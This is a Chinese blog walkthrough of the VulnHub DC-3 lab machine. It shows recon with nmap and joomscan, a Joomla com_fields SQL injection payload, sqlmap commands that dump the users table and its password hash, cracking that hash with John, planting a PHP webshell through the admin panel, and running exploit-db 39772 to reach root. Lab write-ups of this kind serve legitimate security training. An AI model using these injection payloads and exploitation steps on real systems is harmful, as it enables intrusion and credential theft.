<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        何止
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.0"></head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            DC系列靶机第三篇
        </p>
        <hr>
    </div>
    <div class="post-content">
        <blockquote>
<p>  资源地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-3-2.zip">https://download.vulnhub.com/dc/DC-3-2.zip</a></p>
<p>  本机：192.168.3.15</p>
<p>  靶机：192.168.3.19</p>
</blockquote>
<h2 id="1-主机发现-amp-信息收集"><a href="#1-主机发现-amp-信息收集" class="headerlink" title="1. 主机发现&amp;信息收集"></a>1. 主机发现&amp;信息收集</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.3.0/24</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1txd1h3aj30va07at9t.jpg" alt="image-20220104184427120"></p>
<p>首页面给我们了信息，“只有一个flag，需要提权到root”</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1u0hwug6j31ho0q0wh9.jpg" alt="image-20220104184529529"></p>
<p>可以发现web是旧梦</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1u0mhsqej30rg0pi0uy.jpg" alt="image-20220104184741179"></p>
<p>joomscan扫一下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u <span class="string">&quot;http://192.168.3.19/&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vcgngk6j30dt0f1abf.jpg" alt="image-20220104190310570"></p>
<h2 id="2-漏洞测试-amp-利用"><a href="#2-漏洞测试-amp-利用" class="headerlink" title="2. 漏洞测试&amp;利用"></a>2. 漏洞测试&amp;利用</h2><h3 id="sql注入部分"><a href="#sql注入部分" class="headerlink" title="sql注入部分"></a>sql注入部分</h3><p>首先测试注入漏洞，搜索常见joomla漏洞测试即可，发现存在sql注入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.19/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1u886xtpj31ga0tc77o.jpg" alt="image-20220104185520424"></p>
<p>sqlmap一下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">&quot;http://192.168.3.19/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=1&quot;</span> --dbs --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vc8qpv5j316o0i6n1q.jpg" alt="image-20220104185451119"></p>
<p>跑出来了一些字段</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1uof1e8oj31oq0t8ahf.jpg" alt="image-20220104191050990"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">&quot;http://192.168.3.19/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="string">&quot;joomladb&quot;</span> -T <span class="string">&quot;#__users&quot;</span> -C <span class="string">&quot;id,email,name,password,params,params&quot;</span> --dump  -p <span class="string">&quot;list[fullordering]&quot;</span> --batch</span><br><span class="line"></span><br><span class="line"> 629 | freddy@norealaddress.net | admin | $2y$10<span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> | &#123;<span class="string">&quot;admin_style&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;admin_language&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;language&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;editor&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;helpsite&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;timezone&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ux5e1mvj31ev04jwg0.jpg" alt="image-20220104191420675"></p>
<h3 id="John破解hash"><a href="#John破解hash" class="headerlink" title="John破解hash"></a>John破解hash</h3><blockquote>
<p>  John the Ripper免费的开源软件，是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span> &gt; dc-3hash.txt</span><br><span class="line">jhon dc-3hash.txt</span><br><span class="line">破解得到密码snoopy</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1uxaojm0j30ks0740u4.jpg" alt="image-20220104191915310"></p>
<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>后台地址：<a target="_blank" rel="noopener" href="http://192.168.3.19/administrator/index.php">http://192.168.3.19/administrator/index.php</a></p>
<p>登陆进后台后有个php管理的模块，可以编辑php，写🐴。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1v5xif8xj31ds0u0454.jpg" alt="image-20220104192743224"></p>
<p>连接</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vbtz640j31ke0pg43a.jpg" alt="image-20220104193324139"></p>
<h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h2><p>发现了sudo ,但是sudo -l无果</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vdm1zknj31bk0rqgq0.jpg" alt="image-20220104193505048"></p>
<h3 id="查版本"><a href="#查版本" class="headerlink" title="查版本"></a>查版本</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wvzjhetj31is08k0ur.jpg" alt="image-20220104194042884"></p>
<h3 id="搜索提权exp"><a href="#搜索提权exp" class="headerlink" title="搜索提权exp"></a>搜索提权exp</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wvtm05sj30kp0c5797.jpg" alt="image-20220104202712344"></p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>使用39772：<a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a> ，上传后解压</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wuj3zcoj31720d8tcb.jpg" alt="image-20220104202556531"></p>
<p>反弹shell并执行脚本</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wyen7mkj30dn05kt8x.jpg" alt="image-20220104202857994"></p>
<p>执行doubleput，flag在/root下</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wyatfvzj30i90jljtp.jpg" alt="image-20220104202835076"></p>
<h2 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h2><ol>
<li> 搜索漏洞可以使用<strong>searchsploit</strong></li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04  </span><br></pre></td></tr></table></figure>

<ol start="2">
<li> joomla漏洞扫描</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u <span class="string">&quot;http://192.168.3.19/&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1x7w3m4fj30ef0dy40d.jpg" alt="image-20220104203816491"></p>
<ol start="3">
<li> John破解hash</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span> &gt; dc-3hash.txt</span><br><span class="line">jhon dc-3hash.txt</span><br><span class="line">破解得到密码snoopy</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1uxaojm0j30ks0740u4.jpg" alt="image-20220104191915310"></p>

    </div>

    
        <hr class="fhr">
        <div id="vcomments"></div>
    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2022 何止</a>.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label>
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="IxFMlnhlVtQfoUGr9ijp8odV-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="PgOqIqKdyrNfiySdX8j4YeV0">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>